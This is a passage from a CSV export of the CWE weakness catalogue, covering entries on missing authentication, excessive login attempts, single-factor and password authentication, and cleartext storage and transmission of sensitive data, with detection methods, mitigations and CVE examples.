inadvertently sets the password to a single character, allowing remote attackers to easily guess the password and gain administrative privileges.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0088::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Authentication Bypass by Primary Weakness::\",,\"::TYPE:Relationship:NOTE:Most authentication bypass errors are resultant, not primary.::\",\n306,\"Missing Authentication for Critical Function\",Base,Draft,\"The product does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.\",\"\",::NATURE:ChildOf:CWE ID:287:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Architecture and Design:NOTE:Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.::PHASE:Operation:NOTE:When migrating data to the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), there is a risk of losing the protections that were originally provided by hosting on internal networks. If access does not require authentication, it can be easier for attackers to access the data from anywhere on the Internet.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Other:IMPACT:Gain Privileges or Assume Identity:IMPACT:Varies by Context:NOTE:Exposing critical functionality essentially provides an attacker with the privilege level of that functionality. The consequences will depend on the associated functionality, but they can range from reading or modifying sensitive data, accessing administrative or other privileged functionality, or possibly even executing arbitrary code.::\",\"::METHOD:Manual Analysis:DESCRIPTION:This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. Specifically, manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries. Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.:EFFECTIVENESS:Limited::METHOD:Manual Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Web Application Scanner Web Services Scanner Database Scanners:EFFECTIVENESS:SOAR Partial::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Host Application Interface Scanner Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.) Formal Methods / Correct-By-Construction Cost effective for partial coverage: Attack Modeling:EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability. Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected, including those channels that are assumed to be accessible only by authorized parties. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port. In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:DESCRIPTION:Where possible, avoid implementing custom, grow-your-own authentication routines and consider using authentication capabilities as provided by the surrounding framework, operating system, or environment. These capabilities may avoid common weaknesses that are unique to authentication; support automatic auditing and tracking; and make it easier to provide a clear separation between authentication tasks and authorization tasks. In environments such as the World Wide Web, the line between authentication and authorization is sometimes blurred. If custom authentication routines are required instead of those provided by the server, then these routines must be applied to every single page, since these pages could be requested directly.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].::PHASE:Implementation System Configuration Operation:DESCRIPTION:When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to require strong authentication for users who should be allowed to access the data [REF-1297] [REF-1298] [REF-1302].::\",\"::REFERENCE:CVE-2022-31260:DESCRIPTION:Chain: a digital asset management program has an undisclosed backdoor in the legacy version of a PHP script (CWE-912) that could allow an unauthenticated user to export metadata (CWE-306):LINK:https://www.cve.org/CVERecord?id=CVE-2022-31260::REFERENCE:CVE-2022-29951:DESCRIPTION:TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29951::REFERENCE:CVE-2022-29952:DESCRIPTION:Condition Monitor firmware uses a protocol that does not require authentication.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29952::REFERENCE:CVE-2022-30276:DESCRIPTION:SCADA-based protocol for bridging WAN and LAN traffic has no authentication.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30276::REFERENCE:CVE-2022-30313:DESCRIPTION:Safety Instrumented System uses proprietary TCP protocols with no authentication.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30313::REFERENCE:CVE-2022-30317:DESCRIPTION:Distributed Control System (DCS) uses a protocol that has no authentication.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30317::REFERENCE:CVE-2021-21972:DESCRIPTION:Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-21972::REFERENCE:CVE-2020-10263:DESCRIPTION:Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10263::REFERENCE:CVE-2021-23147:DESCRIPTION:WiFi router does not require authentication for its UART port, allowing adversaries with physical access to execute commands as root:LINK:https://www.cve.org/CVERecord?id=CVE-2021-23147::REFERENCE:CVE-2021-37415:DESCRIPTION:IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-37415::REFERENCE:CVE-2020-13927:DESCRIPTION:Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-13927::REFERENCE:CVE-2002-1810:DESCRIPTION:MFV. Access TFTP server without authentication and obtain configuration file with sensitive plaintext information.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1810::REFERENCE:CVE-2008-6827:DESCRIPTION:Agent software running at privileges does not authenticate incoming requests over an unprotected channel, allowing a Shatter attack.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-6827::REFERENCE:CVE-2004-0213:DESCRIPTION:Product enforces restrictions through a GUI but not through privileged APIs.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0213::REFERENCE:CVE-2020-15483:DESCRIPTION:monitor device allows access to physical UART debug port without authentication:LINK:https://www.cve.org/CVERecord?id=CVE-2020-15483::REFERENCE:CVE-2019-9201:DESCRIPTION:Programmable Logic Controller (PLC) does not have an authentication feature on its communication protocols.:LINK:https://www.cve.org/CVERecord?id=CVE-2019-9201::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:No Authentication for Critical Function::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP31:ENTRY NAME:Missing authentication::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 1.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 1.2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 2.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SR-2::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SVV-3::\",::12::166::216::36::62::,\"\",\n307,\"Improper Restriction of Excessive Authentication Attempts\",Base,Draft,\"The product does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it more susceptible to brute force attacks.\",\"\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:287:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:799:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:An attacker could perform an arbitrary number of authentication attempts using different passwords, and eventually gain access to the targeted account.::\",\"::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Web Application Scanner Web Services Scanner Database Scanners Cost effective for partial coverage: Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Fuzz Tester Framework-based Fuzzer Cost effective for partial coverage: Forced Path Execution:EFFECTIVENESS:High::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Focused Manual Spotcheck - Focused manual analysis of source Manual Source Code Review (not inspections):EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:SOAR Partial::METHOD:Automated Static Analysis:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Configuration Checker:EFFECTIVENESS:SOAR Partial::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Common protection mechanisms include: Disconnecting the user after a small number of failed attempts Implementing a timeout Locking out a targeted account Requiring a computational task on the user's part.::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator. [REF-45]::\",\"::REFERENCE:CVE-2019-0039:DESCRIPTION:the REST API for a network OS has a high limit for number of connections, allowing brute force password guessing:LINK:https://www.cve.org/CVERecord?id=CVE-2019-0039::REFERENCE:CVE-1999-1152:DESCRIPTION:Product does not disconnect or timeout after multiple failed logins.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1152::REFERENCE:CVE-2001-1291:DESCRIPTION:Product does not disconnect or timeout after multiple failed logins.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1291::REFERENCE:CVE-2001-0395:DESCRIPTION:Product does not disconnect or timeout after multiple failed logins.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0395::REFERENCE:CVE-2001-1339:DESCRIPTION:Product does not disconnect or timeout after multiple failed logins.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1339::REFERENCE:CVE-2002-0628:DESCRIPTION:Product does not disconnect or timeout after multiple failed logins.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0628::REFERENCE:CVE-1999-1324:DESCRIPTION:User accounts not disabled when they exceed a threshold; possibly a resultant problem.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1324::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY ID:AUTHENT.MULTFAIL:ENTRY NAME:Multiple Failed Authentication Attempts not Prevented::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP34:ENTRY NAME:Unrestricted authentication::\",::16::49::560::565::600::652::653::,\"\",\n308,\"Use of Single-factor Authentication\",Base,Draft,\"The use of single-factor authentication can lead to unnecessary risk of compromise when compared with the benefits of a dual-factor authentication scheme.\",\"While the use of multiple authentication schemes is simply piling on more complexity on top of authentication, it is inestimably valuable to have such measures of redundancy. The use of weak, reused, and common passwords is rampant on the internet. Without the added protection of multiple authentication schemes, a single mistake can result in the compromise of an account. For this reason, if multiple schemes are possible and also easy to use, they should be implemented and required.\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:654:VIEW ID:1000::NATURE:PeerOf:CWE ID:309:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If the secret in a single-factor authentication scheme gets compromised, full authentication is possible.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Use multiple independent authentication schemes, which ensures that -- if one of the methods is compromised -- the system itself is still likely safe from compromise.::\",\"::REFERENCE:CVE-2022-35248:DESCRIPTION:Chat application skips validation when Central Authentication Service (CAS) is enabled, effectively removing the second factor from two-factor authentication:LINK:https://www.cve.org/CVERecord?id=CVE-2022-35248::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Using single-factor authentication::\",::16::49::509::55::555::560::561::565::600::644::645::652::653::70::,\"\",\n309,\"Use of Password System for Primary Authentication\",Base,Draft,\"The use of password systems as the primary means of authentication may be subject to several flaws or shortcomings, each reducing the effectiveness of the mechanism.\",\"\",::NATURE:ChildOf:CWE ID:1390:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:654:VIEW ID:1000::NATURE:PeerOf:CWE ID:308:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"::Password systems are the simplest and most ubiquitous authentication mechanisms. However, they are subject to such well known attacks,and such frequent compromise that their use in the most simple implementation is not practical.::\",\"\",\"::PHASE:Architecture and Design::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:IMPACT:Gain Privileges or Assume Identity:NOTE:A password authentication mechanism error will almost always result in attackers being authorized as valid users.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:In order to protect password systems from compromise, the following should be noted: Passwords should be stored safely to prevent insider attack and to ensure that -- if a system is compromised -- the passwords are not retrievable. Due to password reuse, this information may be useful in the compromise of other systems these users work with. In order to protect these passwords, they should be stored encrypted, in a non-reversible state, such that the original text password cannot be extracted from the stored value. Password aging should be strictly enforced to ensure that passwords do not remain unchanged for long periods of time. The longer a password remains in use, the higher the probability that it has been compromised. For this reason, passwords should require refreshing periodically, and users should be informed of the risk of passwords which remain in use for too long. Password strength should be enforced intelligently. Rather than restrict passwords to specific content, or specific length, users should be encouraged to use upper and lower case letters, numbers, and symbols in their passwords. The system should also ensure that no passwords are derived from dictionary words.::PHASE:Architecture and Design:DESCRIPTION:Use a zero-knowledge password protocol, such as SRP.::PHASE:Architecture and Design:DESCRIPTION:Ensure that passwords are stored safely and are not reversible.::PHASE:Architecture and Design:DESCRIPTION:Implement password aging functionality that requires passwords be changed after a certain point.::PHASE:Architecture and Design:DESCRIPTION:Use a mechanism for determining the strength of a password and notify the user of weak password use.::PHASE:Architecture and Design:DESCRIPTION:Inform the user of why password protections are in place, how they work to protect data integrity, and why it is important to heed their warnings.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Using password systems::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A3:ENTRY NAME:Broken Authentication and Session Management:MAPPING FIT:CWE More Specific::\",::16::49::509::55::555::560::561::565::600::652::653::70::,\"\",\n312,\"Cleartext Storage of Sensitive Information\",Base,Draft,\"The product stores sensitive information in cleartext within a resource that might be accessible to another control sphere.\",\"Because the information is stored in cleartext (i.e., unencrypted), attackers could potentially read it. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information. When organizations adopt cloud services, it can be easier for attackers to access the data from anywhere on the Internet. In some systems/environments such as cloud, the use of double encryption (at both the software and hardware layer) might be required, and the developer might be solely responsible for both layers, instead of shared responsibility with the administrator of the broader system/environment.\",::NATURE:ChildOf:CWE ID:311:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:311:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:922:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:An attacker with access to the system could read sensitive information stored in cleartext.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation System Configuration Operation:DESCRIPTION:When storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to encrypt the data at rest. [REF-1297] [REF-1299] [REF-1301]::\",\"::REFERENCE:CVE-2022-30275:DESCRIPTION:Remote Terminal Unit (RTU) uses a driver that relies on a password stored in plaintext.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30275::REFERENCE:CVE-2009-2272:DESCRIPTION:password and username stored in cleartext in a cookie:LINK:https://www.cve.org/CVERecord?id=CVE-2009-2272::REFERENCE:CVE-2009-1466:DESCRIPTION:password stored in cleartext in a file with insecure permissions:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1466::REFERENCE:CVE-2009-0152:DESCRIPTION:chat program disables SSL in some circumstances even when the user says to use SSL.:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0152::REFERENCE:CVE-2009-1603:DESCRIPTION:Chain: product uses an incorrect public exponent when generating an RSA key, which effectively disables the encryption:LINK:https://www.cve.org/CVERecord?id=CVE-2009-1603::REFERENCE:CVE-2009-0964:DESCRIPTION:storage of unencrypted passwords in a database:LINK:https://www.cve.org/CVERecord?id=CVE-2009-0964::REFERENCE:CVE-2008-6157:DESCRIPTION:storage of unencrypted passwords in a database:LINK:https://www.cve.org/CVERecord?id=CVE-2008-6157::REFERENCE:CVE-2008-6828:DESCRIPTION:product stores a password in cleartext in memory:LINK:https://www.cve.org/CVERecord?id=CVE-2008-6828::REFERENCE:CVE-2008-1567:DESCRIPTION:storage of a secret key in cleartext in a temporary file:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1567::REFERENCE:CVE-2008-0174:DESCRIPTION:SCADA product uses HTTP Basic Authentication, which is not encrypted:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0174::REFERENCE:CVE-2007-5778:DESCRIPTION:login credentials stored unencrypted in a registry key:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5778::REFERENCE:CVE-2001-1481:DESCRIPTION:Plaintext credentials in world-readable file.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1481::REFERENCE:CVE-2005-1828:DESCRIPTION:Password in cleartext in config file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-1828::REFERENCE:CVE-2005-2209:DESCRIPTION:Password in cleartext in config file.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2209::REFERENCE:CVE-2002-1696:DESCRIPTION:Decrypted copy of a message written to disk given a combination of options and when user replies to an encrypted message.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1696::REFERENCE:CVE-2004-2397:DESCRIPTION:Plaintext storage of private key and passphrase in log file when user imports the key.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2397::REFERENCE:CVE-2002-1800:DESCRIPTION:Admin password in plaintext in a cookie.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1800::REFERENCE:CVE-2001-1537:DESCRIPTION:Default configuration has cleartext usernames/passwords in cookie.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1537::REFERENCE:CVE-2001-1536:DESCRIPTION:Usernames/passwords in cleartext in cookies.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1536::REFERENCE:CVE-2005-2160:DESCRIPTION:Authentication information stored in cleartext in a cookie.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2160::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Plaintext Storage of Sensitive Information::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 4.1 a)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 4.1::\",::37::,\"::TYPE:Terminology:NOTE:Different people use cleartext and plaintext to mean the same thing: the lack of encryption. However, within cryptography, these have more precise meanings. Plaintext is the information just before it is fed into a cryptographic algorithm, including already-encrypted text. Cleartext is any information that is unencrypted, although it might be in an encoded form that is not easily human-readable (such as base64 encoding).::\",\n319,\"Cleartext Transmission of Sensitive Information\",Base,Draft,\"The product transmits sensitive or security-critical data in cleartext in a communication channel that can be sniffed by unauthorized actors.\",\"Many communication channels can be sniffed (monitored) by adversaries during data transmission. For example, in networking, packets can traverse many intermediary nodes from the source to the destination, whether across the internet, an internal network, the cloud, etc. Some actors might have privileged access to a network interface or any link along the channel, such as a router, but they might not be authorized to collect the underlying data. As a result, network traffic could be sniffed by adversaries, spilling security-critical data. Applicable communication channels are not limited to software products. Applicable channels include hardware-specific technologies such as internal hardware networks and external debug channels, supporting remote JTAG debugging. When mitigations are not applied to combat adversaries within the product's threat model, this weakness significantly lowers the difficulty of exploitation by such adversaries. When full communications are recorded or logged, such as with a packet dump, an adversary could attempt to obtain the dump long after the transmission has occurred and try to sniff the cleartext from the recorded communications in the dump itself. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.\",::NATURE:ChildOf:CWE ID:311:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:311:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Cloud Computing:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY CLASS:ICS/OT:TECHNOLOGY PREVALENCE:Often::TECHNOLOGY CLASS:System on Chip:TECHNOLOGY PREVALENCE:Undetermined::TECHNOLOGY NAME:Test/Debug Hardware:TECHNOLOGY PREVALENCE:Often::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Architecture and Design:NOTE:For hardware, this may be introduced when design does not plan for an attacker having physical access while a legitimate user is remotely operating the device.::PHASE:Operation::PHASE:System Configuration::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Read Application Data:IMPACT:Modify Files or Directories:NOTE:Anyone can read the information by gaining access to the channel being used for communication.::\",\"::METHOD:Black Box:DESCRIPTION:Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic. Attach the monitor to the process, trigger the feature that sends the data, and look for the presence or absence of common cryptographic functions in the call tree. Monitor the network and determine if the data packets contain readable commands. Tools exist for detecting if certain encodings are in use. If the traffic contains high entropy, this might indicate the usage of encryption.::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Before transmitting, encrypt the data using reliable, confidentiality-protecting cryptographic protocols.::PHASE:Implementation:DESCRIPTION:When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.::PHASE:Implementation:DESCRIPTION:When designing hardware platforms, ensure that approved encryption algorithms (such as those recommended by NIST) protect paths from security critical data to trusted user applications.::PHASE:Testing:DESCRIPTION:Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.::PHASE:Operation:DESCRIPTION:Configure servers to use encrypted channels for communication, which may include SSL or other secure protocols.::\",\"::REFERENCE:CVE-2022-29519:DESCRIPTION:Programmable Logic Controller (PLC) sends sensitive information in plaintext, including passwords and session tokens.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-29519::REFERENCE:CVE-2022-30312:DESCRIPTION:Building Controller uses a protocol that transmits authentication credentials in plaintext.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-30312::REFERENCE:CVE-2022-31204:DESCRIPTION:Programmable Logic Controller (PLC) sends password in plaintext.:LINK:https://www.cve.org/CVERecord?id=CVE-2022-31204::REFERENCE:CVE-2002-1949:DESCRIPTION:Passwords transmitted in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1949::REFERENCE:CVE-2008-4122:DESCRIPTION:Chain: Use of HTTPS cookie without secure flag causes it to be transmitted across unencrypted HTTP.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4122::REFERENCE:CVE-2008-3289:DESCRIPTION:Product sends password hash in cleartext in violation of intended policy.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-3289::REFERENCE:CVE-2008-4390:DESCRIPTION:Remote management feature sends sensitive information including passwords in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4390::REFERENCE:CVE-2007-5626:DESCRIPTION:Backup routine sends password in cleartext in email.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-5626::REFERENCE:CVE-2004-1852:DESCRIPTION:Product transmits Blowfish encryption key in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-1852::REFERENCE:CVE-2008-0374:DESCRIPTION:Printer sends configuration information, including administrative password, in cleartext.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0374::REFERENCE:CVE-2007-4961:DESCRIPTION:Chain: cleartext transmission of the MD5 hash of password enables attacks against a server that is susceptible to replay (CWE-294).:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4961::REFERENCE:CVE-2007-4786:DESCRIPTION:Product sends passwords in cleartext to a log server.:LINK:https://www.cve.org/CVERecord?id=CVE-2007-4786::REFERENCE:CVE-2005-3140:DESCRIPTION:Product sends file with cleartext passwords in e-mail message intended for diagnostic purposes.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-3140::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Plaintext Transmission of Sensitive Information::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SEC06-J:ENTRY NAME:Do not rely on the default automatic signature verification provided by URLClassLoader and java.util.jar::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:SER02-J:ENTRY NAME:Sign then seal sensitive objects before sending them outside a trust boundary::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP23:ENTRY NAME:Exposed Data::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 4.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 